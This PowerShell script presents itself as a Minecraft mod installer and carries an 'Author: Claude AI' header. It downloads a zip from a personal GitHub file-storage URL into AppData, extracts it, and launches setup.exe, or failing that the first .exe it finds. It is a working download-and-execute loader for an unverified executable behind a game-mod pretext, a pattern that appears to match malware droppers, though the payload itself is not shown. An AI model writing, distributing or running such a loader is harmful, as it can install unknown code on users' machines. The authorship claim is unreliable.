# PowerShell script for downloading and installing Minecraft mod with detailed logging
# Author: Claude AI
# Version with full console output in English

# Enable detailed error output
$ErrorActionPreference = "Stop"

# Function to write logs with timestamp
function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO",
        [string]$Color = "White"
    )
    
    $timestamp = Get-Date -Format "HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    Write-Host $logMessage -ForegroundColor $Color
}

# Function to write headers
function Write-Header {
    param([string]$Title)
    Write-Host ""
    Write-Host "=" * 60 -ForegroundColor Cyan
    Write-Host " $Title" -ForegroundColor Cyan
    Write-Host "=" * 60 -ForegroundColor Cyan
}

# Function to write separators
function Write-Separator {
    Write-Host "-" * 60 -ForegroundColor DarkGray
}

try {
    # Program header
    Clear-Host
    Write-Header "MINECRAFT MOD INSTALLER"
    Write-Log "Initializing installer..." "START" "Green"
    Write-Log "PowerShell version: $($PSVersionTable.PSVersion)" "INFO" "Gray"
    Write-Log "Operating system: $($env:OS)" "INFO" "Gray"
    Write-Log "User: $($env:USERNAME)" "INFO" "Gray"
    
    Write-Separator

    # Define paths
    $appDataPath = $env:APPDATA
    $downloadPath = Join-Path $appDataPath "MinecraftModTemp"
    $zipFile = Join-Path $downloadPath "Minecraftmod.zip"
    $extractPath = Join-Path $downloadPath "extracted"
    $url = "https://raw.githubusercontent.com/Alex212TT/file-storage/main/files/20250607_195730_Minecraftmod.zip"

    Write-Log "Setting up paths..." "CONFIG" "Yellow"
    Write-Log "AppData path: $appDataPath" "CONFIG" "Gray"
    Write-Log "Working directory: $downloadPath" "CONFIG" "Gray"
    Write-Log "Archive file: $zipFile" "CONFIG" "Gray"
    Write-Log "Extract folder: $extractPath" "CONFIG" "Gray"
    Write-Log "Download URL: $url" "CONFIG" "Gray"

    Write-Separator

    # Create temporary folder if it doesn't exist
    Write-Log "Checking working directory..." "STEP" "Yellow"
    if (-not (Test-Path $downloadPath)) {
        New-Item -ItemType Directory -Path $downloadPath -Force | Out-Null
        Write-Log "Created temporary folder: $downloadPath" "SUCCESS" "Green"
    } else {
        Write-Log "Working directory already exists" "INFO" "Green"
    }

    # Clean old files if they exist
    if (Test-Path $zipFile) {
        Remove-Item $zipFile -Force
        Write-Log "Removed old archive" "CLEANUP" "Yellow"
    }
    if (Test-Path $extractPath) {
        Remove-Item $extractPath -Recurse -Force
        Write-Log "Cleaned extract folder" "CLEANUP" "Yellow"
    }

    Write-Separator

    # Download file
    Write-Log "STAGE 1: Downloading file" "STEP" "Cyan"
    Write-Log "Starting download..." "DOWNLOAD" "Yellow"
    Write-Log "Source: $url" "DOWNLOAD" "Gray"
    
    $startTime = Get-Date
    
    # Use System.Net.WebClient for more stable downloading
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "PowerShell MinecraftModInstaller/1.0")
    
    # Add progress handler if possible
    try {
        $webClient.DownloadProgressChanged += {
            $percent = $args[1].ProgressPercentage
            if ($percent % 10 -eq 0) {
                Write-Log "Download progress: $percent%" "DOWNLOAD" "Cyan"
            }
        }
    } catch {
        Write-Log "Progress tracking unavailable" "WARNING" "Yellow"
    }
    
    $webClient.DownloadFile($url, $zipFile)
    $webClient.Dispose()
    
    $downloadTime = (Get-Date) - $startTime
    
    # Check that file was downloaded
    if (-not (Test-Path $zipFile)) {
        throw "File was not downloaded or not found at path: $zipFile"
    }

    $fileSize = (Get-Item $zipFile).Length
    Write-Log "File downloaded successfully!" "SUCCESS" "Green"
    Write-Log "File size: $([math]::Round($fileSize/1024/1024, 2)) MB" "SUCCESS" "Green"
    Write-Log "Download time: $([math]::Round($downloadTime.TotalSeconds, 2)) seconds" "SUCCESS" "Green"
    Write-Log "Speed: $([math]::Round(($fileSize/1024/1024)/$downloadTime.TotalSeconds, 2)) MB/s" "SUCCESS" "Green"

    Write-Separator

    # Create folder for extraction
    Write-Log "STAGE 2: Preparing for extraction" "STEP" "Cyan"
    if (Test-Path $extractPath) {
        Remove-Item $extractPath -Recurse -Force
        Write-Log "Cleaned old extract folder" "CLEANUP" "Yellow"
    }
    New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
    Write-Log "Created extract folder: $extractPath" "SUCCESS" "Green"

    # Extract archive
    Write-Log "Starting archive extraction..." "EXTRACT" "Yellow"
    $extractStartTime = Get-Date
    
    try {
        # Use built-in .NET classes for extraction
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipFile, $extractPath)
        Write-Log "Archive extracted using .NET Framework" "SUCCESS" "Green"
    }
    catch {
        Write-Log ".NET extraction error, trying alternative method..." "WARNING" "Yellow"
        # Alternative method through PowerShell 5.0+
        Expand-Archive -Path $zipFile -DestinationPath $extractPath -Force
        Write-Log "Archive extracted using PowerShell Expand-Archive" "SUCCESS" "Green"
    }
    
    $extractTime = (Get-Date) - $extractStartTime
    Write-Log "Extraction time: $([math]::Round($extractTime.TotalSeconds, 2)) seconds" "SUCCESS" "Green"

    # Show contents of extracted folder
    Write-Log "Archive contents:" "INFO" "Cyan"
    $extractedItems = Get-ChildItem -Path $extractPath -Recurse
    foreach ($item in $extractedItems | Select-Object -First 10) {
        $itemType = if ($item.PSIsContainer) { "DIR " } else { "FILE" }
        $itemSize = if (-not $item.PSIsContainer) { " ($([math]::Round($item.Length/1024, 2)) KB)" } else { "" }
        Write-Log "  $itemType $($item.Name)$itemSize" "INFO" "Gray"
    }
    if ($extractedItems.Count -gt 10) {
        Write-Log "  ... and $($extractedItems.Count - 10) more items" "INFO" "Gray"
    }

    Write-Separator

    # Look for installer folder and setup.exe file
    Write-Log "STAGE 3: Looking for installer file" "STEP" "Cyan"
    Write-Log "Searching for 'installer' folder..." "SEARCH" "Yellow"
    
    $installerPath = Get-ChildItem -Path $extractPath -Name "installer" -Recurse -Directory | Select-Object -First 1
    
    if (-not $installerPath) {
        Write-Log "'installer' folder not found, searching for setup.exe in all folders..." "SEARCH" "Yellow"
        # Look for setup.exe in all subfolders
        $setupFiles = Get-ChildItem -Path $extractPath -Name "setup.exe" -Recurse -File
        if ($setupFiles) {
            $setupExe = $setupFiles[0].FullName
            Write-Log "Found setup.exe at path: $setupExe" "SUCCESS" "Green"
        } else {
            # Show all .exe files for debugging
            Write-Log "setup.exe not found. Searching for all .exe files:" "WARNING" "Yellow"
            $exeFiles = Get-ChildItem -Path $extractPath -Filter "*.exe" -Recurse -File
            if ($exeFiles) {
                foreach ($exe in $exeFiles) {
                    Write-Log "  Found: $($exe.Name) in $($exe.DirectoryName)" "INFO" "Gray"
                }
                Write-Log "Will try to use first found .exe file" "WARNING" "Yellow"
                $setupExe = $exeFiles[0].FullName
            } else {
                throw "No .exe files found in archive"
            }
        }
    } else {
        $installerFullPath = Join-Path $extractPath $installerPath
        $setupExe = Join-Path $installerFullPath "setup.exe"
        Write-Log "Found installer folder: $installerFullPath" "SUCCESS" "Green"
        
        if (-not (Test-Path $setupExe)) {
            Write-Log "setup.exe not found in installer folder, looking for other .exe files..." "WARNING" "Yellow"
            $exeInInstaller = Get-ChildItem -Path $installerFullPath -Filter "*.exe" -File
            if ($exeInInstaller) {
                $setupExe = $exeInInstaller[0].FullName
                Write-Log "Found alternative .exe: $($exeInInstaller[0].Name)" "SUCCESS" "Green"
            } else {
                throw "setup.exe file not found in installer folder: $setupExe"
            }
        } else {
            Write-Log "Found setup.exe in installer folder" "SUCCESS" "Green"
        }
    }

    # Information about found file
    $setupFileInfo = Get-Item $setupExe
    Write-Log "Installer file information:" "INFO" "Cyan"
    Write-Log "  Name: $($setupFileInfo.Name)" "INFO" "Gray"
    Write-Log "  Path: $($setupFileInfo.FullName)" "INFO" "Gray"
    Write-Log "  Size: $([math]::Round($setupFileInfo.Length/1024, 2)) KB" "INFO" "Gray"
    Write-Log "  Creation date: $($setupFileInfo.CreationTime)" "INFO" "Gray"

    Write-Separator

    # Run installer
    Write-Log "STAGE 4: Running installer" "STEP" "Cyan"
    Write-Log "Preparing to launch..." "LAUNCH" "Yellow"
    Write-Log "Executable file: $setupExe" "LAUNCH" "Gray"
    Write-Log "Working directory: $(Split-Path $setupExe -Parent)" "LAUNCH" "Gray"
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $setupExe
    $processInfo.WorkingDirectory = Split-Path $setupExe -Parent
    $processInfo.UseShellExecute = $true
    # WITHOUT administrator rights
    
    Write-Log "Launching installer..." "LAUNCH" "Yellow"
    $process = [System.Diagnostics.Process]::Start($processInfo)
    
    if ($process) {
        Write-Log "Installer launched successfully!" "SUCCESS" "Green"
        Write-Log "Process ID: $($process.Id)" "SUCCESS" "Green"
        Write-Log "Process name: $($process.ProcessName)" "SUCCESS" "Green"
    } else {
        throw "Failed to launch installer"
    }
    
    # Wait a bit for process to stabilize
    Write-Log "Waiting for process stabilization..." "WAIT" "Yellow"
    Start-Sleep -Seconds 3
    
    # Check that process is still running
    try {
        $runningProcess = Get-Process -Id $process.Id -ErrorAction SilentlyContinue
        if ($runningProcess) {
            Write-Log "Installer process is running stable" "SUCCESS" "Green"
        } else {
            Write-Log "Installer process completed (possibly quick installation)" "WARNING" "Yellow"
        }
    } catch {
        Write-Log "Could not check installer process status" "WARNING" "Yellow"
    }

    Write-Separator

    # Final information
    Write-Header "INSTALLATION COMPLETED SUCCESSFULLY"
    Write-Log "Installer is launched and running" "SUCCESS" "Green"
    Write-Log "Follow the instructions in the installer window" "INFO" "Cyan"
    
    # Information about temporary files - НЕ УДАЛЯЕМ
    Write-Log "Temporary files management:" "INFO" "Yellow"
    Write-Log "  Temporary folder: $downloadPath" "INFO" "Gray"
    Write-Log "  Temporary files size: $([math]::Round((Get-ChildItem $downloadPath -Recurse | Measure-Object -Property Length -Sum).Sum/1024/1024, 2)) MB" "INFO" "Gray"
    Write-Log "Temporary files saved at: $downloadPath" "INFO" "Cyan"
    Write-Log "You can delete them manually later if needed" "INFO" "Gray"

    $totalTime = (Get-Date) - $startTime
    Write-Separator
    Write-Log "Total execution time: $([math]::Round($totalTime.TotalSeconds, 2)) seconds" "FINAL" "Green"
    Write-Log "Script executed successfully!" "FINAL" "Green"
    
    # Автоматическое завершение программы после успешной работы
    Write-Log "Script will exit automatically in 3 seconds..." "FINAL" "Yellow"
    Start-Sleep -Seconds 3
    exit 0

}
catch {
    Write-Header "AN ERROR OCCURRED"
    Write-Log "Critical script execution error" "ERROR" "Red"
    Write-Log "Error message: $($_.Exception.Message)" "ERROR" "Red"
    Write-Log "Error line: $($_.InvocationInfo.ScriptLineNumber)" "ERROR" "Red"
    Write-Log "Error command: $($_.InvocationInfo.Line.Trim())" "ERROR" "Red"
    
    Write-Host ""
    Write-Log "Detailed error information:" "DEBUG" "DarkRed"
    Write-Host $_.Exception.ToString() -ForegroundColor DarkRed
    
    Write-Separator
    Write-Log "Try to:" "HELP" "Yellow"
    Write-Log "1. Check internet connection" "HELP" "Gray"
    Write-Log "2. Run script as administrator" "HELP" "Gray"
    Write-Log "3. Check URL availability: $url" "HELP" "Gray"
    Write-Log "4. Free up disk space" "HELP" "Gray"
    
    # Автоматическое завершение программы при ошибке
    Write-Log "Script will exit automatically in 5 seconds..." "ERROR" "Red"
    Start-Sleep -Seconds 5
    exit 1
}
finally {
    # Убираем ожидание нажатия клавиши
}